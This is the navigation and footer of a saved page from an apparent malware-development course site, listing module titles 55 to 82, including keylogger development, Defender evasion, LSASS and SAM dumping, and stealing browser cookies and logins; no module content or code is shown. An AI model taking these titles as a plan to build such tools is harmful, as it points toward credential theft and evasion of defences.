                <a data-target="_self" href="./55.html&amp;toc=true">
                    <div for="module-55" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 55 - Introduction to Foliage Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-56" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./56.html&amp;toc=true">
                    <div for="module-56" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 56 - Implementing Ekko With Stack Spoofing
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-57" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./57.html&amp;toc=true">
                    <div for="module-57" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 57 - Token Manipulation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-58" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./58.html&amp;toc=true">
                    <div for="module-58" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 58 - Library Proxy Loading
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-59" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./59.html&amp;toc=true">
                    <div for="module-59" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 59 - Heap Encryption With Ekko Sleep Obfuscation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-60" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./60.html&amp;toc=true">
                    <div for="module-60" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 60 - Introduction To Executing .NET Assemblies 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-61" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./61.html&amp;toc=true">
                    <div for="module-61" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 61 - Evading Microsoft Defender Via Patching 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-62" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./62.html&amp;toc=true">
                    <div for="module-62" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 62 - .NET Assemblies - Patching System.Environment.Exit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-63" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./63.html&amp;toc=true">
                    <div for="module-63" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 63 - Capturing And Saving Screenshots Into Memory
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-64" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./64.html&amp;toc=true">
                    <div for="module-64" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 64 - Cross-Architecture Injection: x86 to x64 Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-65" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./65.html&amp;toc=true">
                    <div for="module-65" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 65 - KnownDll Cache Poisoning Injection
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-66" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./66.html&amp;toc=true">
                    <div for="module-66" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 66 - Introduction to Keylogging
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-67" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./67.html&amp;toc=true">
                    <div for="module-67" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 67 - Developing a Keylogger
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-68" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./68.html&amp;toc=true">
                    <div for="module-68" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 68 - Sending Keystrokes To Remote Server
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-69" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./69.html&amp;toc=true">
                    <div for="module-69" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 69 - Manipulating VEH For Local Code Execution 
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-70" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./70.html&amp;toc=true">
                    <div for="module-70" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 70 - Introduction To LSASS Dumping
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-71" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./71.html&amp;toc=true">
                    <div for="module-71" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 71 - Fetching LSASS Handle And Bypassing PPL
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-72" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./72.html&amp;toc=true">
                    <div for="module-72" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 72 - LSASS Dump Via Handle Duplication
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-73" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./73.html&amp;toc=true">
                    <div for="module-73" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 73 - LSASS Dump Via RtlReportSilentProcessExit
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-74" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./74.html&amp;toc=true">
                    <div for="module-74" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 74 - LSASS Dump Via Seclogon Race Condition
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-75" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./75.html&amp;toc=true">
                    <div for="module-75" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 75 - Dumping The SAM Database
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-76" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./76.html&amp;toc=true">
                    <div for="module-76" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 76 - Dumping The SAM Remotely
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-77" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./77.html&amp;toc=true">
                    <div for="module-77" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 77 - Dumping The SAM From Disk
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-78" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./78.html&amp;toc=true">
                    <div for="module-78" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 78 - Domain Enumeration Using MS-SAMR
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-79" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./79.html&amp;toc=true">
                    <div for="module-79" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 79 - Dumping Browser Cookies: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-80" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./80.html&amp;toc=true">
                    <div for="module-80" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 80 - Dumping Saved Logins: Firefox
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-81" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./81.html&amp;toc=true">
                    <div for="module-81" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 81 - Dumping Browser Cookies: Chrome
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-82" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" onclick="return false;">
                <a data-target="_self" href="./82.html&amp;toc=true">
                    <div for="module-82" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 82 - Dumping Saved Logins: Chrome
                    </div>
                </a>
            </div>
                </div>
    </div>
</div>          </div>
      </div>

      
      <div class="flex">
  <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-r border-l border-gray-600/60 pl-4 pt-2 pb-2 rounded-bl-xl rounded-br-xl shadow-inner">

          <div class="mr-2">
        <a data-target="_self" href="./30.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Previous</button>
        </a>
      </div>
    
    <div class="mr-2">
      <a data-target="_self" href="../All Modules.html?toc=true">
        <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Modules</button>
      </a>
    </div>

    <div class="my-2 mr-2">
      <form id="complete-module" action="./31/complete" method="POST">
      </form>
      <form id="uncomplete-module" action="./3#" method="POST">
      </form>
    </div>

          <div class="mr-2">
        <a data-target="_self" href="./32.html&amp;toc=true">
          <button class="w-[100px] h-10 px-5 text-sm font-medium text-white
             rounded-xl backdrop-blur-xl backdrop-saturate-150
             bg-gradient-to-b from-blue-600/85 to-blue-700/85
             hover:from-blue-500/85 hover:to-blue-600/85
             border border-blue-300/30 ring-1 ring-inset ring-white/10
             shadow-[0_6px_18px_-8px_rgba(0,0,0,0.7)]
             transition-all duration-200 focus:outline-none
             focus-visible:ring-2 focus-visible:ring-white/30">Next</button>
        </a>
      </div>
    
  </div>
</div>

      
      <input type="hidden" id="objectives-completed" value="20973">

      
      <div id="copyWarning" class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm">
  <div class="relative bg-gray-800 border border-gray-600 rounded-2xl shadow-2xl p-8 max-w-lg w-11/12 text-center transform transition-all scale-100">
    <p class="text-2xl font-bold text-white mb-4 tracking-wide">
      Reminder
    </p>
    <p class="text-gray-300 text-base mb-6 leading-relaxed">
      To remain compliant with the Terms of Service, avoid copying the entire module and instead copy the necessary sections.
    </p>
    <button onclick="hideCopyWarning()" class="w-full text-white font-medium rounded-lg text-sm px-5 py-2.5 text-center transition-all duration-200 bg-blue-600/80 hover:bg-blue-500/80 border border-blue-400/40 backdrop-blur-sm backdrop-saturate-150">
      I understand
    </button>
    <span class="absolute top-3 right-3 text-gray-400 hover:text-gray-200 cursor-pointer text-xl" onclick="hideCopyWarning()"></span>
  </div>
</div>

      
        </div>

  <footer id="footer" class="text-gray-400
    bg-gradient-to-t from-[#101926] via-[#172130] to-[#1e293b] backdrop-blur-md backdrop-saturate-150 z-20 border-t border-gray-700/50 border-gray-800
     hidden body-font">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4"> 2025 Maldev Academy Inc.</p>
        <a href="https://x.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 1200 1227" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill="">
            <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""></path>
          </svg>            
        </a>
        <a href="https://github.com/Maldev-Academy" target="_blank" class="text-gray-500 hover:text-white ml-2 sm:mt-0 mt-4">
          <svg class="w-6 h-6" fill="white" viewBox="0 0 24 24" aria-hidden="true" style="--darkreader-inline-fill: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms of Service
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer></div>
        

        <script src="31_files/jquery-3.6.0.min.js"></script>
        <script src="31_files/bootstrap.min.js"></script>
        <script src="31_files/navbar.js"></script>
        

<link rel="preload" as="style" href="31_files/app-BoiX-DPv.css"><link rel="modulepreload" href="31_files/app-D9jIIQde.js"><link rel="stylesheet" href="31_files/app-BoiX-DPv.css"><style class="darkreader darkreader--sync" media="screen"></style><script type="module" src="31_files/app-D9jIIQde.js"></script><script src="31_files/moduleviewer.js" defer="defer"></script>

</body></html>